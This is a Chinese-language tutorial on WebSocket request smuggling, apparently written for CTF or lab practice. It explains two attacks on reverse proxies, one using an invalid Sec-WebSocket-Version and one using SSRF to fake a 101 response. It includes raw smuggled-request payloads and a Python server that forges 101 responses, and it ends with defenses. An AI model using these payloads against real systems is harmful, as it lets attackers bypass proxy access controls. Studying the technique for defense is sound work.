## 概述 (Overview)

WebSocket 协议允许在客户端（浏览器）和服务器之间建立一个持久的、双向的通信通道，实现了全双工通信。这与传统的 HTTP 请求-响应模式不同，后者需要客户端主动发起请求才能接收服务器信息。WebSocket 通常用于实时应用，如聊天、通知等。

请求走私的概念也可以应用于 WebSocket 的升级过程，特别是当代理服务器在处理这个升级过程时存在缺陷时。

## WebSocket 基础 (WebSocket Basics)

*   **目的 (Purpose):** 解决 HTTP 轮询带来的效率低下问题，实现服务器主动向客户端推送信息。
*   **通信方式 (Communication):** 全双工，意味着客户端和服务器可以同时发送和接收数据。
*   **连接建立 (Connection Establishment):**
    1.  **HTTP 升级请求 (HTTP Upgrade Request):** 客户端发起一个标准的 HTTP GET 请求，但包含特定的头部来请求将连接升级到 WebSocket。
        *   `Upgrade: websocket`
        *   `Connection: Upgrade`
        *   `Sec-WebSocket-Version`: 指定 WebSocket 协议版本（通常为 `13`）。
        *   `Sec-WebSocket-Key`: 一个随机生成的 Base64 编码的密钥。
    2.  **服务器响应 (Server Response):** 如果服务器支持 WebSocket 并同意升级：
        *   返回 `HTTP/1.1 101 Switching Protocols` 状态码。
        *   响应头部包含 `Upgrade: websocket` 和 `Connection: Upgrade`。
        *   `Sec-WebSocket-Accept`: 服务器根据客户端的 `Sec-WebSocket-Key` 计算得出的一个值，用于确认。
    3.  **协议切换 (Protocol Switch):** 一旦握手成功，该 TCP 连接上的通信协议就从 HTTP 切换到 WebSocket。

*   **代理行为 (Proxy Behavior):** 当 WebSocket 升级请求通过代理服务器时，许多代理（尤其是未配置为特殊处理 WebSocket 的）在连接升级后，会将后续的客户端和服务器之间的 WebSocket 流量视为不透明的二进制流进行隧道传输，不再解析其内容。

## WebSocket 请求走私 (WebSocket Request Smuggling)

核心思想是欺骗代理服务器，使其认为 WebSocket 连接已经成功升级并开始隧道传输后续流量，而实际上后端服务器并未完成升级，仍在期望 HTTP 流量。

### 利用场景1: 代理不检查升级响应 (Proxy Doesn't Check Upgrade Response)

*   **原理:** 某些代理服务器在转发 WebSocket 升级请求后，可能不会检查后端服务器的响应状态码（例如，是 `101` 还是 `426 Upgrade Required`），而是盲目地假设升级成功，并开始隧道化后续通信。
*   **攻击方法:**
    1.  **构造恶意升级请求:** 客户端发送一个 WebSocket 升级请求，但故意使用一个后端服务器不支持的 `Sec-WebSocket-Version` (例如 `777`)。
    2.  **代理转发:** 代理将此请求转发给后端。
    3.  **后端拒绝升级:** 后端服务器因版本不匹配，会响应一个错误状态码，如 `426 Upgrade Required`，并指示其支持的版本。连接**并未**升级到 WebSocket，后端仍然期望 HTTP。
    4.  **代理错误判断:** 存在漏洞的代理忽略了后端的 `426` 响应，错误地认为升级已成功，并开始将后续来自客户端的数据作为 WebSocket 流量直接隧道传输到后端。
    5.  **走私HTTP请求:** 攻击者在恶意升级请求之后，紧接着发送一个标准的 HTTP 请求。由于代理认为这是 WebSocket 流量，它会原封不动地将这个 HTTP 请求转发给仍在等待 HTTP 请求的后端服务器。
*   **后果:** 攻击者可以通过这个“损坏的” WebSocket 隧道向后端发送任意 HTTP 请求，常用于绕过代理层面的访问控制。这种技术通常只影响攻击者自己的连接（请求隧道），不直接影响其他用户。
*   **示例 Payload (攻击者发送):**
    ```
    GET /socket HTTP/1.1  # 假设 /socket 是一个正常的WebSocket端点
    Host: <target_ip>:<port>
    Sec-WebSocket-Version: 777 # 无效版本，导致后端拒绝升级
    Upgrade: WebSocket
    Connection: Upgrade
    Sec-WebSocket-Key: <random_key>

    GET /flag HTTP/1.1         # 被走私的HTTP请求
    Host: <target_ip>:<port>
    ```
*   **后端响应 (给代理):**
    ```
    HTTP/1.1 426 Upgrade Required
    Sec-WebSocket-Version: 7, 8, 13
    ...
    ```
*   **代理行为:** 忽略 `426`，开始隧道模式。
*   **后端接收 (通过隧道):** `GET /flag HTTP/1.1 ...`
*   **即使没有 WebSocket 端点:** 有些代理甚至不需要目标路径 (`/`) 实际支持 WebSocket。只要升级请求的头部看起来像 WebSocket 升级，代理就可能被欺骗。

### 利用场景2: 代理检查升级响应，但可被欺骗 (Proxy Checks Response, but Can Be Tricked)

*   **原理:** 当代理会检查后端响应是否为 `101 Switching Protocols` 才进行隧道化时，攻击者需要找到一种方法让后端服务器对一个非 WebSocket 升级的请求返回一个伪造的 `101` 响应。
*   **攻击方法 (结合 SSRF):**
    1.  **发现SSRF漏洞:** 目标应用存在服务器端请求伪造 (SSRF) 漏洞，允许攻击者控制后端服务器向任意 URL 发起请求，并可能影响其响应。
    2.  **设置恶意服务器:** 攻击者搭建一个 Web 服务器，该服务器对所有接收到的请求都固定响应 `HTTP/1.1 101 Switching Protocols`。
    3.  **构造SSRF触发的升级请求:**
        *   攻击者向目标应用的 SSRF 端点 (例如 `/check-url?server=<attacker_controlled_url>`) 发送一个请求。
        *   这个请求本身也包含 WebSocket 升级头部 (`Upgrade: websocket`, `Connection: Upgrade`, `Sec-WebSocket-Version: 13`, `Sec-WebSocket-Key: ...`)。
    4.  **代理转发与SSRF触发:**
        *   代理将这个包含升级头部的请求转发给目标应用的 SSRF 端点。
        *   目标应用后端通过 SSRF 漏洞向攻击者控制的恶意服务器发起请求。
    5.  **恶意服务器返回假101:** 攻击者的恶意服务器响应 `101 Switching Protocols`。这个 `101` 响应会作为 SSRF 端点对原始升级请求的响应返回给代理。
    6.  **代理被欺骗:** 代理看到来自后端（实际上是 SSRF 端点间接返回的）的 `101` 响应，认为 WebSocket 升级成功，开始隧道化后续流量。
    7.  **走私HTTP请求:** 攻击者在最初的 SSRF 触发请求之后，紧接着发送一个标准的 HTTP 请求，该请求将被代理通过隧道转发给后端。
*   **示例 Payload (攻击者发送):**
    ```
    GET /check-url?server=http://<attacker_ip>:<attacker_port> HTTP/1.1 # SSRF端点
    Host: <target_ip>:<proxy_port>
    Sec-WebSocket-Version: 13
    Upgrade: WebSocket
    Connection: Upgrade
    Sec-WebSocket-Key: <random_key>

    GET /flag HTTP/1.1         # 被走私的HTTP请求
    Host: <target_ip>:<proxy_port>
    ```
*   **攻击者恶意服务器 (python 示例):**
    ```python
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import sys

    class FakeUpgrade(BaseHTTPRequestHandler):
       def do_GET(self):
           self.protocol_version = "HTTP/1.1"
           self.send_response(101) # 伪造101响应
           self.end_headers()

    if __name__ == '__main__':
        if len(sys.argv) != 2:
            print(f"Usage: {sys.argv[0]} <port>")
            sys.exit(1)
        port = int(sys.argv[1])
        httpd = HTTPServer(("", port), FakeUpgrade)
        print(f"Starting fake 101 server on port {port}...")
        httpd.serve_forever()
    ```

## 工具与技巧 (Tools & Tips)

*   **Burp Suite Repeater:**
    *   可用于手动构造和发送 WebSocket 请求走私的 payload。
    *   **重要:** 确保禁用 "Update Content-Length" 设置，以防止 Burp 自动修改精心构造的请求体。
    *   注意 Payload 末尾需要有正确的 CRLF 序列 (通常是两个 `\r\n` 分隔主请求和走私请求)。
*   **`nc` (netcat):** 对于某些代理或 Burp Suite 可能干扰的场景，直接使用 `nc` 发送原始 HTTP 请求可能更可靠。
*   **Payload 结构:** 走私的 HTTP 请求通常紧跟在伪造的升级请求（或其头部）之后，中间用一个空行 (`\r\n\r\n`) 分隔，就如同两个连续的 HTTP/1.1 请求。

## 防御策略 (Defense Strategies)

1.  **代理正确处理升级:** 代理服务器应严格遵守 WebSocket 协议规范：
    *   验证 `Sec-WebSocket-Version`。
    *   仅在收到后端明确的 `101 Switching Protocols` 响应（并验证 `Sec-WebSocket-Accept`）后才切换到隧道模式。
    *   如果升级失败（如收到 `426` 或其他错误码），则不应建立隧道，并应正确处理后续数据为 HTTP。
2.  **最小化代理信任:** 不要假设代理会完美处理所有边缘情况。后端应用也应有自身的安全机制。
3.  **SSRF 防护:** 严格限制服务器发出的网络请求，防止攻击者利用 SSRF 漏洞控制服务器响应或访问内部资源。
4.  **WAF/IDS 规则:** 配置 Web 应用防火墙或入侵检测系统以识别异常的 WebSocket 升级尝试或已知的走私模式。
5.  **软件更新:** 保持代理服务器、Web 服务器和应用程序框架的更新，以修复已知的漏洞。